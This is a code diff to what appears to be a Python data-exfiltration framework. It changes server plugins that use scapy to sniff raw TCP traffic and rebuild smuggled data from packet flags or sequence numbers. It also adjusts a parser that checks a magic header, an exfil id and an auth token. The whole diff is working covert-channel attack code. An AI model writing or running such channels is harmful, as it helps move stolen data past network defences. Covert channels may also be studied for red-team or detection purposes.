@@ -142,17 +142,30 @@ class _RawSession:
                     return None
                 self.stage = "eid_len"; self.expected = 1; self.buf.clear()
         elif self.stage == "eid_len":
-            self.eid_len = b; self.stage = "eid"; self.expected = self.eid_len; self.buf.clear()
+            self.eid_len = b; self.expected = self.eid_len; self.buf.clear()
+            if self.eid_len == 0:
+                if b"" != self.target_eid:
+                    self.stage = "magic"; self.expected = len(MAGIC)
+                    return None
+                self.stage = "tok_len"; self.expected = 1
+            else:
+                self.stage = "eid"
         elif self.stage == "eid":
             self.buf.append(b)
             if len(self.buf) == self.expected:
                 if bytes(self.buf) != self.target_eid:
-                    # reset
                     self.stage = "magic"; self.buf.clear(); self.expected = len(MAGIC)
                     return None
                 self.stage = "tok_len"; self.expected = 1; self.buf.clear()
         elif self.stage == "tok_len":
-            self.tok_len = b; self.stage = "tok"; self.expected = self.tok_len; self.buf.clear()
+            self.tok_len = b; self.expected = self.tok_len; self.buf.clear()
+            if self.tok_len == 0:
+                if b"" != self.target_tok:
+                    self.stage = "magic"; self.expected = len(MAGIC)
+                    return None
+                self.stage = "body"
+            else:
+                self.stage = "tok"
         elif self.stage == "tok":
             self.buf.append(b)
             if len(self.buf) == self.expected:
@@ -189,36 +202,30 @@ class _RawCollector:
             if b:
                 yield b
 
-def _sniff_syn(port: int, collector: _RawCollector, iface: Optional[str] = None):
-    from scapy.all import sniff, TCP
-    def cb(pkt):
-        if TCP in pkt and pkt[TCP].dport == port and (pkt[TCP].flags & 0x02):  # SYN
-            v = (pkt[TCP].seq - SEQ_BASE) & 0xFF
-            collector.push_symbol(v)
-    sniff(filter=f"tcp and dst port {port}", prn=cb, store=False, iface=iface)
-
-def _sniff_ack(port: int, collector: _RawCollector, iface: Optional[str] = None):
-    from scapy.all import sniff, TCP
-    def cb(pkt):
-        if TCP in pkt and pkt[TCP].dport == port and (pkt[TCP].flags & 0x10) and not (pkt[TCP].flags & 0x02):  # ACK and not SYN
-            v = (pkt[TCP].seq - SEQ_BASE) & 0xFF
-            collector.push_symbol(v)
-    sniff(filter=f"tcp and dst port {port}", prn=cb, store=False, iface=iface)
-
-class TcpServerSynAck(ExfilServerPlugin):
+class TcpServerFlags(ExfilServerPlugin):
     canal = "TCP"
-    metodo = 1  # SYN-ACK
-    name = "tcp_server_synack"
+    metodo = 1  # FLAGS
+    name = "tcp_server_flags"
 
     def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
+        from scapy.all import sniff, TCP
         bind_port = int(config.get("bind_port") or 9001)
         exfil_id = config.get("exfil_id") or "default"
         auth_token = config.get("auth_token")
         iface = config.get("iface")
-        collector = _RawCollector(exfil_id, auth_token)
-        th = threading.Thread(target=_sniff_syn, args=(bind_port, collector, iface), daemon=True)
-        th.start()
-        return collector.iter()
+        sess = _RawSession(exfil_id, auth_token)
+        result: list = []
+        def cb(pkt):
+            if TCP in pkt and pkt[TCP].dport == bind_port:
+                v = int(pkt[TCP].flags) & 0xFF
+                out = sess.feed(v)
+                if out is not None:
+                    result.append(out)
+        sniff(filter=f"tcp and dst port {bind_port}", prn=cb, store=False,
+              iface=iface, stop_filter=lambda _: sess.done)
+        def gen():
+            yield from result
+        return gen()
 
 class TcpServerSeq(ExfilServerPlugin):
     canal = "TCP"
@@ -226,11 +233,21 @@ class TcpServerSeq(ExfilServerPlugin):
     name = "tcp_server_seq"
 
     def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
+        from scapy.all import sniff, TCP
         bind_port = int(config.get("bind_port") or 9002)
         exfil_id = config.get("exfil_id") or "default"
         auth_token = config.get("auth_token")
         iface = config.get("iface")
-        collector = _RawCollector(exfil_id, auth_token)
-        th = threading.Thread(target=_sniff_ack, args=(bind_port, collector, iface), daemon=True)
-        th.start()
-        return collector.iter()
+        sess = _RawSession(exfil_id, auth_token)
+        result: list = []
+        def cb(pkt):
+            if TCP in pkt and pkt[TCP].dport == bind_port and (pkt[TCP].flags & 0x02):
+                v = (pkt[TCP].seq - SEQ_BASE) & 0xFF
+                out = sess.feed(v)
+                if out is not None:
+                    result.append(out)
+        sniff(filter=f"tcp and dst port {bind_port}", prn=cb, store=False,
+              iface=iface, stop_filter=lambda _: sess.done)
+        def gen():
+            yield from result
+        return gen()
